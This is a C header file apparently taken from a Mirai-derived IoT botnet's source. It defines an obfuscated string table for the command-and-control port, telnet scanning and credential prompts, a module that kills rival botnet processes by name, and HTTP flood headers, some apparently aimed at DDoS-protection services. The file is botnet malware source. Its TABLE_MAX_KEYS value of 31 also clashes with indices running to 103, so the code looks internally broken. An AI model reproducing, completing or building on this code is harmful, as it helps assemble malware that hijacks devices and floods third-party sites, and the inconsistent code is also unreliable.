#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};
#define TABLE_CNC_PORT 1
#define TABLE_SCAN_CB_PORT 2
#define TABLE_EXEC_SUCCESS 3
#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_KILL_9 12
#define TABLE_KILLER_PROC 13
#define TABLE_KILLER_EXE 14
#define TABLE_KILLER_FD 15
#define TABLE_KILLER_MAPS 16
#define TABLE_KILLER_TCP 17
#define TABLE_MEM_ROUTE 18
#define TABLE_MEM_ASSWD 19
#define TABLE_ATK_VSE 20
#define TABLE_ATK_RESOLVER 21
#define TABLE_ATK_NSERV 22
#define TABLE_MISC_WATCHDOG 23
#define TABLE_MISC_WATCHDOG2 24
#define TABLE_SCAN_ASSWORD 25
#define TABLE_SCAN_OGIN 26
#define TABLE_SCAN_ENTER 27
#define TABLE_MISC_RAND 28
#define TABLE_KILLER_STATUS 29
#define TABLE_KILLER_ANIME 30
#define TABLE_EXEC_MIRAI 32
#define TABLE_EXEC_SORA1 33
#define TABLE_EXEC_SORA2 34
#define TABLE_EXEC_SORA3 35
#define TABLE_EXEC_OWARI 36
#define TABLE_EXEC_OWARI2 37
#define TABLE_EXEC_JOSHO 38
#define TABLE_EXEC_APOLLO 39
#define TABLE_EXEC_STATUS 40
#define TABLE_EXEC_ANIME 41
#define TABLE_EXEC_ROUTE 42
#define TABLE_EXEC_CPUINFO 43
#define TABLE_EXEC_BOGO 44
#define TABLE_EXEC_RC 45
#define TABLE_EXEC_MASUTA1 46
#define TABLE_EXEC_MIRAI1 47
#define TABLE_EXEC_MIRAI2 48
#define TABLE_EXEC_VAMP1 49
#define TABLE_EXEC_VAMP3 50
#define TABLE_EXEC_IRC1 51
#define TABLE_EXEC_QBOT1 52
#define TABLE_EXEC_QBOT2 53
#define TABLE_EXEC_IRC2 54
#define TABLE_EXEC_MIRAI3 55
#define TABLE_EXEC_EXE 56
#define TABLE_EXEC_OMNI 57
#define TABLE_EXEC_LOL 58
#define TABLE_EXEC_SHINTO3 59
#define TABLE_EXEC_SHINTO5 60
#define TABLE_EXEC_JOSHO5 61
#define TABLE_EXEC_JOSHO4 62 
#define TABLE_KILLER_UPX 63

#define TABLE_KILLER_REP1 64
#define TABLE_KILLER_REP2 65
#define TABLE_KILLER_REP3 66
#define TABLE_KILLER_REP4 67
#define TABLE_KILLER_REP5 68
#define TABLE_KILLER_REP6 69
#define TABLE_KILLER_REP7 70
#define TABLE_KILLER_REP8 71
#define TABLE_KILLER_REP9 72
#define TABLE_KILLER_REP10 73

#define TABLE_ATK_KEEP_ALIVE            74
#define TABLE_ATK_ACCEPT                75
#define TABLE_ATK_ACCEPT_LNG            76
#define TABLE_ATK_CONTENT_TYPE          77
#define TABLE_ATK_SET_COOKIE            78
#define TABLE_ATK_REFRESH_HDR           79
#define TABLE_ATK_LOCATION_HDR          80
#define TABLE_ATK_SET_COOKIE_HDR        81
#define TABLE_ATK_CONTENT_LENGTH_HDR    82
#define TABLE_ATK_TRANSFER_ENCODING_HDR 83
#define TABLE_ATK_CHUNKED               84
#define TABLE_ATK_KEEP_ALIVE_HDR        85
#define TABLE_ATK_CONNECTION_HDR        86
#define TABLE_ATK_DOSARREST             87
#define TABLE_ATK_CLOUDFLARE_NGINX      88
#define TABLE_HTTP_1                  	89
#define TABLE_HTTP_2                  	90
#define TABLE_HTTP_3                	91
#define TABLE_HTTP_4                 	92 
#define TABLE_HTTP_5                 	93
#define TABLE_HTTP_6                 	94
#define TABLE_HTTP_7                 	95
#define TABLE_HTTP_8                 	96
#define TABLE_HTTP_9                 	97
#define TABLE_HTTP_10                 	98
#define TABLE_HTTP_11                 	99
#define TABLE_HTTP_12                 	100
#define TABLE_HTTP_13                 	101
#define TABLE_HTTP_14                 	102
#define TABLE_HTTP_15                 	103

#define TABLE_MAX_KEYS 31

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
